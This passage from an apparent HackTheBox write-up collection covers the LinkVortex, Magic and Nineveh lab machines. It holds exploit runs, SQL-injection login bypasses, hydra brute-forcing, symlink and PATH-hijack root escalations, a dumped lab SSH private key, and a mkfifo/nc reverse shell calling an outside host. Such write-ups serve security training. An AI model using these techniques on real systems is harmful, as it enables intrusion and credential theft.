Dockerfile.ghost\n        modified:   ghost/core/test/regression/api/admin/authentication.test.js\n</code></pre> <pre><code>FROM ghost:5.58.0\n\n# Copy the config\nCOPY config.production.json /var/lib/ghost/config.production.json\n\n# Prevent installing packages\nRUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb\n\n# Wait for the db to be ready first\nCOPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh\nCOPY entry.sh /entry.sh\nRUN chmod +x /var/lib/ghost/wait-for-it.sh\nRUN chmod +x /entry.sh\n\nENTRYPOINT [\"/entry.sh\"]\nCMD [\"node\", \"current/index.js\"]\n</code></pre> <p>Show the other one's changes:</p> <pre><code>$ git diff --staged                                                   \ndiff --git a/Dockerfile.ghost b/Dockerfile.ghost\nn...\n--- a/ghost/core/test/regression/api/admin/authentication.test.js\n+++ b/ghost/core/test/regression/api/admin/authentication.test.js\n@@ -53,7 +53,7 @@ describe('Authentication API', function () {\n\n         it('complete setup', async function () {\n             const email = 'test@example.com';\n-            const password = 'thisissupersafe';\n+            const password = 'OctopiFociPilfer45';\n\n             const requestMock = nock('https://api.github.com')\n                 .get('/repos/tryghost/dawn/zipball')\n</code></pre> <p>So there is a new password: <code>OctopiFociPilfer45</code></p> <p>The password works in the main domain.</p> <p></p> <p>There is an LFI vulnerability: https://github.com/TryGhost/Ghost/security/advisories/GHSA-9c9v-w225-v5rg, so using an exploit: https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.sh</p> <pre><code>$ ./exploit.sh -u admin@linkvortex.htb -p OctopiFociPilfer45\nWELCOME TO THE CVE-2023-40028 SHELL\nfile&gt; /var/lib/ghost/config.production.json\n{\n  \"url\": \"http://localhost:2368\",\n  \"server\": {\n    \"port\": 2368,\n    \"host\": \"::\"\n  },\n  \"mail\": {\n    \"transport\": \"Direct\"\n  },\n  \"logging\": {\n    \"transports\": [\"stdout\"]\n  },\n  \"process\": \"systemd\",\n  \"paths\": {\n    \"contentPath\": \"/var/lib/ghost/content\"\n  },\n  \"spam\": {\n    \"user_login\": {\n        \"minWait\": 1,\n        \"maxWait\": 604800000,\n        \"freeRetries\": 5000\n    }\n  },\n  \"mail\": {\n     \"transport\": \"SMTP\",\n     \"options\": {\n      \"service\": \"Google\",\n      \"host\": \"linkvortex.htb\",\n      \"port\": 587,\n      \"auth\": {\n        \"user\": \"bob@linkvortex.htb\",\n        \"pass\": \"fibber-talented-worth\"\n        }\n      }\n    }\n}\n</code></pre> <p>So <code>bob@linkvortex.htb:fibber-talented-worth</code></p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"linkvortex/#initial-access","title":"Initial Access","text":"<p>Access SSH with <code>bob</code> password</p> <pre><code>$ ssh bob@linkvortex.htb\nbob@linkvortex.htb's password: \nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the 'unminimize' command.\nLast login: Tue Dec  3 11:41:50 2024 from 10.10.14.62\nbob@linkvortex:~$ whoami\nbob\n</code></pre> <p>Get the flag</p> <pre><code>bob@linkvortex:~$ cat user.txt\nc7ba51dbed472b7419869c783ce27334\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"linkvortex/#privilege-escalation","title":"Privilege Escalation","text":"<p>The user has sudo privileges to execute:</p> <pre><code>bob@linkvortex:~$ sudo -l\nMatching Defaults entries for bob on linkvortex:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty, env_keep+=CHECK_CONTENT\n\nUser bob may run the following commands on linkvortex:\n    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png\n</code></pre> <p>Looking at the script:</p> <pre><code>bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh \n#!/bin/bash\n\nQUAR_DIR=\"/var/quarantined\"\n\nif [ -z $CHECK_CONTENT ];then\n  CHECK_CONTENT=false\nfi\n\nLINK=$1\n\nif ! [[ \"$LINK\" =~ \\.png$ ]]; then\n  /usr/bin/echo \"! First argument must be a png file !\"\n  exit 2\nfi\n\nif /usr/bin/sudo /usr/bin/test -L $LINK;then\n  LINK_NAME=$(/usr/bin/basename $LINK)\n  LINK_TARGET=$(/usr/bin/readlink $LINK)\n  if /usr/bin/echo \"$LINK_TARGET\" | /usr/bin/grep -Eq '(etc|root)';then\n    /usr/bin/echo \"! Trying to read critical files, removing link [ $LINK ] !\"\n    /usr/bin/unlink $LINK\n  else\n    /usr/bin/echo \"Link found [ $LINK ] , moving it to quarantine\"\n    /usr/bin/mv $LINK $QUAR_DIR/\n    if $CHECK_CONTENT;then\n      /usr/bin/echo \"Content:\"\n      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null\n    fi\n  fi\nfi\n</code></pre> <p>If the link points to <code>/etc</code> or <code>/root</code> it gets deleted, if not, it can be read if the variable <code>CHECK_CONTENT</code> is set to something other than empty. So first export the variable to <code>true</code>, then, create a link of a link, as the script only checks the first link.</p> <p>Let's try to read root's <code>id_rsa</code>.</p> <pre><code>bob@linkvortex:~$ ln -s /root/.ssh/id_rsa /home/bob/second\nbob@linkvortex:~$ ln -s /home/bob/second first.png\nbob@linkvortex:~$ ls\nfirst.png  second  user.txt\nbob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh first.png\nLink found [ first.png ] , moving it to quarantine\nContent:\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n</code></pre> <p>Now the only thing left is to access as root via the private key.</p> <pre><code>$ ssh root@10.10.11.47 -i id_rsa \nThe authenticity of host '10.10.11.47 (10.10.11.47)' can't be established.\nED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:41: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.47' (ED25519) to the list of known hosts.\nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the 'unminimize' command.\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Mon Dec  2 11:20:43 2024 from 10.10.14.61\nroot@linkvortex:~# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"linkvortex/#post-exploitation","title":"Post Exploitation","text":"<pre><code>root@linkvortex:~# cat root.txt\n59ca41d4c7fa9b856e69f52cca00a32b\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"magic/","title":"Magic","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"magic/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.185\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 23:06 CEST\nNmap scan report for 10.10.10.185\nHost is up (0.041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)\n|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)\n|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Magic Portfolio\nDevice type: general purpose|router\nRunning: Linux 5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   40.32 ms 10.10.14.1\n2   40.62 ms 10.10.10.185\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.41 seconds\n</code></pre> <p>Port <code>80</code> shows a site about magic pictures made in <code>PHP</code>.</p> <p></p> <p>Searching the bottom right number (it's hex for magic), we find information about a PHP type juggling vulnerability.</p> <p>There is a login form at <code>/login.php</code> that is vulnerable to SQLi.</p> <p></p> <p>Intercept the request with <code>Caido</code> and put <code>' OR '1'='1'-- -</code> in the password field to bypass authentication.</p> <p></p> <p></p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"magic/#initial-access","title":"Initial Access","text":"<p>To bypass the file whitelist (<code>jpg</code>, <code>jpeg</code>, <code>png</code>), put a PHP reverse shell in a normal jpg file.</p> <p></p> <p>Upload the file with a double extension <code>.php.jpg</code> and go to the path where all images are uploaded: <code>/images/uploads/</code>.</p> <p></p> <p>So, put a bash reverse shell and start a listener.</p> <p></p> <pre><code>$ sudo rlwrap nc -lnvp 80\n[sudo] password for kali: \nlistening on [any] 80 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.10.185] 51236\nbash: cannot set terminal process group (1229): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@magic:/var/www/Magic/images/uploads$ whoami\nwhoami\nwww-data\nwww-data@magic:/var/www/Magic/images/uploads$ \n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"magic/#privilege-escalation","title":"Privilege Escalation","text":"<p>Examining the app, we find the database config.</p> <p></p> <p>And there is a <code>mysql</code> instance on <code>3306</code>.</p> <pre><code>ss -ntplu\nNetid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  \nudp    UNCONN   0        0                 0.0.0.0:54434          0.0.0.0:*     \nudp    UNCONN   0        0                 0.0.0.0:5353           0.0.0.0:*     \nudp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*     \nudp    UNCONN   0        0                 0.0.0.0:68             0.0.0.0:*     \nudp    UNCONN   0        0                 0.0.0.0:631            0.0.0.0:*     \nudp    UNCONN   0        0                    [::]:5353              [::]:*     \nudp    UNCONN   0        0                    [::]:53480             [::]:*     \ntcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*     \ntcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*     \ntcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*     \ntcp    LISTEN   0        5               127.0.0.1:631            0.0.0.0:*     \ntcp    LISTEN   0        128                     *:80                   *:*     \ntcp    LISTEN   0        128                  [::]:22                [::]:*     \ntcp    LISTEN   0        5                   [::1]:631               [::]:*\n</code></pre> <p>So, expose the port with <code>chisel</code>.</p> <pre><code>$ ./chisel server --port 5555 --reverse\n2025/05/20 13:50:12 server: Reverse tunnelling enabled\n2025/05/20 13:50:12 server: Fingerprint zxld6D6IlWWZXhFcL+dvetmj/NbXygDLvjuOJoR6IaQ=\n2025/05/20 13:50:12 server: Listening on http://0.0.0.0:5555\n2025/05/20 13:50:24 server: session#1: tun: proxy#R:3306=&gt;localhost:3306: Listening\n\nwww-data@magic:/tmp$ ./chisel client 10.10.14.11:5555 R:3306:localhost:3306\n./chisel client 10.10.14.11:5555 R:3306:localhost:3306\n2025/05/20 04:43:07 client: Connecting to ws://10.10.14.11:5555\n2025/05/20 04:43:08 client: Connected (Latency 44.137534ms)\n</code></pre> <p>And connect to the database.</p> <pre><code>$ mysql -u theseus -P 3306 -p --skip-ssl\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 10214\nServer version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMySQL [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| Magic              |\n+--------------------+\n2 rows in set (0.043 sec)\n\nMySQL [(none)]&gt; use magic;\nERROR 1044 (42000): Access denied for user 'theseus'@'localhost' to database 'magic'\nMySQL [(none)]&gt; use Magic;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMySQL [Magic]&gt; show tables;\n+-----------------+\n| Tables_in_Magic |\n+-----------------+\n| login           |\n+-----------------+\n1 row in set (0.043 sec)\n\nMySQL [Magic]&gt; select * from login;\n+----+----------+----------------+\n| id | username | password       |\n+----+----------+----------------+\n|  1 | admin    | Th3s3usW4sK1ng |\n+----+----------+----------------+\n1 row in set (0.041 sec)\n\nMySQL [Magic]&gt; exit\nBye\n</code></pre> <p>Pivot to <code>theseus</code>:</p> <pre><code>www-data@magic:/var/www/Magic/images/uploads$ su - theseus\nsu - theseus\nPassword: Th3s3usW4sK1ng\n\ntheseus@magic:~$ whoami\nwhoami                                                                                          \ntheseus\n</code></pre> <p>Get the flag</p> <pre><code>theseus@magic:~$ cat user.txt\ncat user.txt\n8892373356de16931deba839326cf201\n</code></pre> <p></p> <p>Using <code>ltrace</code> on <code>sysinfo</code> we notice</p> <p></p> <p>It calls <code>fdisk</code> without the full path.</p> <pre><code>$ cat fdisk\nchmod +s /bin/bash\n</code></pre> <p>Add <code>/tmp</code> to the user's path and execute:</p> <pre><code>theseus@magic:/tmp$ export PATH=\"/tmp:$PATH\"\nexport PATH=\"/tmp:$PATH\"\ntheseus@magic:/tmp$ syinfo\nsyinfo\n</code></pre> <pre><code>theseus@magic:/tmp$ ls -alh /bin/bash\nls -alh /bin/bash\n-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash\n</code></pre> <pre><code>theseus@magic:/tmp$ bash -p\nbash -p\nbash-4.4# whoami\nwhoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"magic/#post-exploitation","title":"Post Exploitation","text":"<pre><code>cat root.txt\nbcc1fd50a588e421e53dc5e054de001a\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"nineveh/","title":"Nineveh","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"nineveh/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.43 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 11:50 CEST\nNmap scan report for 10.10.10.43\nHost is up (0.042s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR\n| Not valid before: 2017-07-01T15:03:30\n|_Not valid after:  2018-07-01T15:03:30\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|storage-misc\nRunning (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Google Android 8.X (91%), Synology DiskStation Manager 7.X (88%)\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:8 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4\nAggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Android 8 - 9 (Linux 3.18 - 4.4) (91%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.11 - 4.9 (91%), Linux 3.13 or 4.2 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   42.86 ms 10.10.14.1\n2   42.89 ms 10.10.10.43\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.96 seconds\n</code></pre> <p>The site at <code>80</code> is the default page</p> <p></p> <p>The site at <code>443</code> shows a picture</p> <p></p> <p><code>gobuster</code> discovers <code>http://10.10.10.43/department</code> path and <code>https://10.10.10.43/db</code>, <code>https://10.10.10.43/secure_notes</code> and <code>https://10.10.10.43/server-status</code></p> <pre><code>$ gobuster dir -u http://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 80 -k \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.43\n[+] Method:                  GET\n[+] Threads:                 80\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/department           (Status: 301) [Size: 315] [--&gt; http://10.10.10.43/department/]\n/server-status        (Status: 403) [Size: 299]\n</code></pre> <pre><code>$ gobuster dir -u https://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 80 -k\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     https://10.10.10.43\n[+] Method:                  GET\n[+] Threads:                 80\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/db                   (Status: 301) [Size: 309] [--&gt; https://10.10.10.43/db/]\n/server-status        (Status: 403) [Size: 300]\n/secure_notes         (Status: 301) [Size: 319] [--&gt; https://10.10.10.43/secure_notes/]\nProgress: 207643 / 207644 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <p><code>/department</code> shows a login form</p> <p></p> <p><code>/db</code> shows a phpliteadmin 1.9 form</p> <p></p> <p><code>/secure_notes</code> is only an image</p> <p></p> <p>Using <code>hydra</code> we get the password for the phpliteadmin</p> <pre><code>$ hydra 10.10.10.43 -l test -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form \"/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password\"\n</code></pre> <p></p> <p><code>password123</code></p> <p></p> <p>Using <code>searchsploit</code> we find a way to inject a webshell by creating a table.</p> <p></p> <p>Create a database ending in <code>.php</code> and add a table with a <code>txt</code> field containing a webshell.</p> <p></p> <p>The path to the shell</p> <p></p> <p>But for now, I can't reach it.</p> <p>We can also try <code>hydra</code> at <code>/management</code></p> <pre><code>$ hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form /department/login.php:\"username=^USER^&amp;password=^PASS^:Invalid Password\"\n</code></pre> <p></p> <p><code>admin:1q2w3e4r5t</code></p> <p></p> <p>Going to notes</p> <p></p> <p>Looking for an LFI, it only works if we leave <code>ninevehNotes</code> strings and then the path traversal</p> <p></p> <p>Trying the path to the webshell from before:</p> <p></p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"nineveh/#initial-access","title":"Initial Access","text":"<p>So if we put a bash reverse shell.</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.17 443 &gt;/tmp/f\n\n# url encoded\nrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.17%20443%20%3E%2Ftmp%2Ff\n</code></pre> <pre><code>$ sudo rlwrap nc -lnvp 443    \n[sudo] password for kali: \nlistening on [any] 443 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.10.43] 44224\nbash: cannot set terminal process group (1401): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@nineveh:/var/www/html/department$ whoami\nwhoami\nwww-data\n</code></pre> <p>Looking at the picture from <code>/secure_notes</code> we find files inside</p> <pre><code>$ binwalk nineveh.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced\n84            0x54            Zlib compressed data, best compression\n2881744       0x2BF8D0        POSIX tar archive (GNU)\n</code></pre> <p>In the other hand, we have a <code>knockd</code> service running</p> <p></p> <pre><code>www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/knockd.conf\ncat /etc/knockd.conf\n[options]\n logfile = /var/log/knockd.log\n interface = ens160\n\n[openSSH]\n sequence = 571, 290, 911 \n seq_timeout = 5\n start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n\n[closeSSH]\n sequence = 911,290,571\n seq_timeout = 5\n start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n</code></pre> <p>So looking at the config, if we hit those ports in the same order, the <code>ssh</code> port will open.</p> <pre><code>$ for x in 571 290 911 22; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n571/tcp filtered umeter\n\nNmap done: 1 IP address (1 host up) scanned in 1.08 seconds\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n290/tcp filtered unknown\n\nNmap done: 1 IP address (1 host up) scanned in 1.14 seconds\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n911/tcp filtered xact-backup\n\nNmap done: 1 IP address (1 host up) scanned in 1.12 seconds\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 13:50 CEST\nNmap scan report for 10.10.10.43\nHost is up (0.041s latency).\n\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 0.12 seconds\n</code></pre> <p>Now we can enter via <code>ssh</code> with the private key.</p> <pre><code>$ ssh amrois@10.10.10.43 -i nineveh.priv   \nThe authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.\nED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.43' (ED25519) to the list of known hosts.\nUbuntu 16.04.2 LTS\nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * 